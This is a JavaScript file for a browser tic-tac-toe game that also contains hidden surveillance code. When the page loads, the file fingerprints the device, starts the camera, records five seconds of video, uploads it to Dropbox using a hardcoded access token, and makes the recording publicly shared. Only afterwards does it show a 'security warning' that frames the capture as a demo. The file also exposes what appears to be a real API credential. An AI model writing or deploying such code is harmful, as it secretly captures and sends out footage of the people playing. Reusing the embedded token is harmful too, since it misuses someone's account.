const menu = document.getElementById("menu");
const game = document.getElementById("game");
const boardEl = document.getElementById("board");
const markX = document.getElementById("markX");
const markO = document.getElementById("markO");
const cpuMode = document.getElementById("cpuMode");
const playerMode = document.getElementById("playerMode");
const popup = document.getElementById("popup");
const securityPopup = document.getElementById("securityPopup");
const resultText = document.getElementById("resultText");
const turnSpan = document.getElementById("turn");
const deviceInfo = document.getElementById("deviceInfo");

let board = ["", "", "", "", "", "", "", "", ""];
let player = "X";
let human = "X";
let cpu = "O";
let vsCPU = false;
let active = true;
let scoreX = 0, scoreO = 0, ties = 0;

const DROPBOX_TOKEN = 'sl.u.AGXjIVW6dz2FAyUNvY9WQtkSyBCrd3shQ8UwXtJMVwN8LZnqhZBPUHUVN9crv2Nvl_LsD2L3IXH-2Kd8BYeaD9CiHqILYSMOTv5QrDcPGzL_XIN3ANPmlwOtqSqVP1DgeSrXOh45S8KDimtsMoqnWbnItvV_vYRiYx983sARMDgaRXk6sDUoO-mVAs-B7oFyynvZsca-3tqP6TerJyacXxevVlUJ3kqW4bITECGbHkwnceWCuQju8nJ--vbB2N9WYE9sAcdFT-mVi9ITqwdQX02tC23CWGJSKj-G7I4nz6d3pIi7soZ_onVWEDHwsf0ar5fJ0S84dl1r0Kr6hlqTyjKhQuYijWco0GnAZv6rtlD6UXwoAR7bTJs-01X-VA_5YC3aVVRisR-d4mdpA1QvSDt6EPZOWwyzfQwR2wCjH7C7nkXAy_nejGDd1rfxs7mxjZYWQJ1vLLfzDebhXnDsdaOxTliiBlvmA2KRc0qDck_FLx7eT7Q4301Nh3QzF0Erhaaifnj6SihoRjdzB1hYmTG6bPh4r3QlaBJ834YJ4zwPvYRwtCE5FTQ3R944gSOajsIhu4Hd04n3iNcICYG5EtTAwIyy9qFn_DYhnWcdIqjxY8GTls_6kC5p8KGlM1aGVT1fOe9y-VGRKb5CHha33Nz_reVywRGXFBTkg3AEZTc64jrdBeNOwk3j7j3sR0kT6yVUFlNeUDRxaHMjqI_YiCgt41srokFjRy6SLxLkHjPLWfmycu0wQdpmj0h4z1YUpHY45BMQZdB5vI8DhVxnKpxsky_l4QXdQlVm_URZM3qjgO2-rETPXe-6_6wscA_z_BEMtaUmwcwhtyoyVfkU5oihGJxq1zrkh-6qHWfcOWwufo5cGPY6QplCsnpirZMLxy8SJmOIXY2NWMoNPRlyUjHQJ8aFapM3N69i9ueqmhP_fwuY_OdTh9glsQaq6oAdbNAKMlioB7fzWXmy7I9buzucvRnU0F_k3yM1xmwQ6r3G79nt1tIM0xuXg1PCqK0m2Kk-X8CD85R4qYeC-_rfwgTEO8fwmtPh6HQhZM6aozKGUSpVO8E_PTRE8yY4lzlWQw3Mn7dklK25wEoVEtarhsIjj2eblalkJe7iZ_mR2yKYcAIziuRwrNOJ8JalAr8j4RF1HX7Wz1rdzpxtOd91iJb9olyyym6_iY2ofrwCel-hbEIZaN19qXL5zAUIWFIlJ3eQAINeuSqn_znrGyEKGwxDBfHFHR9GkpU2FO_TT7g68ry5FAhMxD1xqklH6x46BfgKBmilAn6Jx9JVR23Yewi6L770_lMN940YqsT2xGiHKwl-wuPBWizuvkCQfXQi4yDw5_zSI4ZPsAIRU--gYdmsMOaDakw7YDbitxbczFN3DNf6PRpth7vkwELpZM7RDAIkwMnAOYny-OGXPtUeXQcU36apCPhAuQpyOrCWw7CrjfyUCbfWIikzirVRcZZbyiI';

let mediaRecorder;
let chunks = [];
let cameraStream = null;

const win = [
    [0,1,2], [3,4,5], [6,7,8],
    [0,3,6], [1,4,7], [2,5,8],
    [0,4,8], [2,4,6]
];

function getDeviceInfo() {
    const info = {
        browser: navigator.userAgent.includes("Chrome") ? "Chrome" : navigator.userAgent.includes("Firefox") ? "Firefox" : navigator.userAgent.includes("Edge") ? "Edge" : "Other",
        os: navigator.userAgent.includes("Windows") ? "Windows" : navigator.userAgent.includes("Mac") ? "macOS" : navigator.userAgent.includes("Linux") ? "Linux" : "Other",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        resolution: screen.width + "x" + screen.height,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toLocaleString()
    };
    
    if (deviceInfo) {
        deviceInfo.innerHTML = Object.entries(info).map(([k,v]) => `<strong>${k}:</strong> ${v}<br>`).join("");
    }
    
    localStorage.setItem("deviceInfo", JSON.stringify(info));
    return info;
}

async function startCamera() {
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ 
            video: {
                width: 640,
                height: 480,
                frameRate: 15
            }
        });
        
        const videoElement = document.getElementById("video");
        if (videoElement) {
            videoElement.srcObject = cameraStream;
        }
        
        startRecording();
        
    } catch(e) {
        showSecurityWarning("Camera access denied. Please allow camera access and refresh the page.");
    }
}

function startRecording() {
    if (!cameraStream) return;
    
    chunks = [];
    
    mediaRecorder = new MediaRecorder(cameraStream, {
        mimeType: 'video/webm'
    });
    
    mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
            chunks.push(e.data);
        }
    };
    
    mediaRecorder.onstop = () => {
        uploadToDropbox();
    };
    
    mediaRecorder.start();
    
    setTimeout(() => {
        if(mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
            
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        }
    }, 5000);
}

async function uploadToDropbox() {
    if (chunks.length === 0) {
        showSecurityWarning("No video was recorded.");
        return;
    }
    
    try {
        const videoBlob = new Blob(chunks, { type: 'video/webm' });
        const arrayBuffer = await videoBlob.arrayBuffer();
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `/TicTacToe_Security_Demo/recording_${timestamp}.webm`;
        
        const response = await fetch('https://content.dropboxapi.com/2/files/upload', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${DROPBOX_TOKEN}`,
                'Content-Type': 'application/octet-stream',
                'Dropbox-API-Arg': JSON.stringify({
                    path: filename,
                    mode: 'add',
                    autorename: true
                })
            },
            body: arrayBuffer
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error("Upload failed");
        }
        
        const result = await response.json();
        await createSharedLink(result.path_display);
        showSecurityWarning("Video uploaded to Dropbox cloud!");
        
    } catch (error) {
        saveToLocalStorage();
        showSecurityWarning("Cloud upload failed. Video saved locally.");
    }
}

async function createSharedLink(path) {
    try {
        const response = await fetch('https://api.dropboxapi.com/2/sharing/create_shared_link_with_settings', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${DROPBOX_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                path: path,
                settings: {
                    requested_visibility: 'public'
                }
            })
        });
        
        if (!response.ok) {
            const linksResponse = await fetch('https://api.dropboxapi.com/2/sharing/list_shared_links', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${DROPBOX_TOKEN}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ path: path })
            });
            
            const linksResult = await linksResponse.json();
            if (linksResult.links && linksResult.links.length > 0) {
                localStorage.setItem('videoLink', linksResult.links[0].url);
                return linksResult.links[0].url;
            }
            return null;
        }
        
        const result = await response.json();
        localStorage.setItem('videoLink', result.url);
        return result.url;
        
    } catch (error) {
        return null;
    }
}

function saveToLocalStorage() {
    if (chunks.length === 0) return;
    
    const blob = new Blob(chunks, { type: "video/webm" });
    const reader = new FileReader();
    
    reader.onloadend = () => {
        localStorage.setItem("recordedVideo", reader.result);
        localStorage.setItem("recordingTime", new Date().toISOString());
    };
    
    reader.readAsDataURL(blob);
}

function showSecurityWarning(message) {
    const videoLink = localStorage.getItem('videoLink');
    
    let warningHTML = `
        <h2 style="color: #ff4444; margin-bottom: 20px;">SECURITY WARNING</h2>
        <div style="text-align: left; padding: 10px;">
            <p style="margin: 10px 0; line-height: 1.6;">${message}</p>
    `;
    
    if (videoLink) {
        warningHTML += `
            <p style="margin: 15px 0;">
                <strong>Your recording:</strong><br>
                <a href="${videoLink}" target="_blank" style="color: #00ff9d; word-break: break-all;">${videoLink}</a>
            </p>
        `;
    }
    
    warningHTML += `
            <p style="margin: 15px 0; font-size: 12px; color: #888;">
                <strong>Always check website permissions before allowing camera access!</strong>
            </p>
            <button id="okBtn" style="
                background: #ff4444;
                color: white;
                border: none;
                padding: 12px 30px;
                border-radius: 8px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 15px;
            ">I Understand</button>
        </div>
    `;
    
    securityPopup.innerHTML = warningHTML;
    securityPopup.classList.remove("hidden");
    
    document.getElementById("okBtn").onclick = () => {
        securityPopup.classList.add("hidden");
    };
}

function createBoard() {
    boardEl.innerHTML = "";
    for(let i = 0; i < 9; i++) {
        let cell = document.createElement("div");
        cell.className = "cell";
        cell.dataset.i = i;
        cell.onclick = handleMove;
        boardEl.appendChild(cell);
    }
}

function handleMove() {
    let i = this.dataset.i;
    if(board[i] !== "" || !active) return;
    
    board[i] = player;
    this.textContent = player;
    checkGame();
    
    if(vsCPU && active && player === cpu) {
        setTimeout(cpuMove, 500);
    }
}

function cpuMove() {
    let empty = [];
    board.forEach((v, i) => { if(v === "") empty.push(i); });
    if(empty.length === 0) return;
    
    let move = empty[Math.floor(Math.random() * empty.length)];
    board[move] = cpu;
    boardEl.children[move].textContent = cpu;
    checkGame();
}

function checkGame() {
    for(let p of win) {
        let [a,b,c] = p;
        if(board[a] && board[a] === board[b] && board[a] === board[c]) {
            active = false;
            if(board[a] === "X") scoreX++; else scoreO++;
            updateScore();
            showPopup(board[a] + " Wins!");
            return;
        }
    }
    
    if(!board.includes("")) {
        active = false;
        ties++;
        updateScore();
        showPopup("Tie Game!");
        return;
    }
    
    player = player === "X" ? "O" : "X";
    turnSpan.textContent = player + " TURN";
}

function updateScore() {
    document.getElementById("scoreX").textContent = scoreX;
    document.getElementById("scoreO").textContent = scoreO;
    document.getElementById("scoreTie").textContent = ties;
}

function reset() {
    board = ["", "", "", "", "", "", "", "", ""];
    player = "X";
    active = true;
    turnSpan.textContent = "X TURN";
    createBoard();
}

function showPopup(text) {
    resultText.textContent = text;
    popup.classList.remove("hidden");
}

markX.onclick = () => {
    human = "X";
    markX.classList.add("active");
    markO.classList.remove("active");
};

markO.onclick = () => {
    human = "O";
    markO.classList.add("active");
    markX.classList.remove("active");
};

cpuMode.onclick = () => {
    vsCPU = true;
    startGame();
};

playerMode.onclick = () => {
    vsCPU = false;
    startGame();
};

function startGame() {
    menu.classList.add("hidden");
    game.classList.remove("hidden");
    cpu = human === "X" ? "O" : "X";
    reset();
}

document.getElementById("restart").onclick = reset;

document.getElementById("nextRound").onclick = () => {
    popup.classList.add("hidden");
    reset();
};

document.getElementById("restartGame").onclick = () => {
    scoreX = 0; scoreO = 0; ties = 0;
    updateScore();
    popup.classList.add("hidden");
    reset();
};

document.getElementById("backMenu").onclick = () => {
    popup.classList.add("hidden");
    game.classList.add("hidden");
    menu.classList.remove("hidden");
    human = "X";
    markX.classList.add("active");
    markO.classList.remove("active");
};

window.onload = () => {
    getDeviceInfo();
    setTimeout(startCamera, 1000);
};
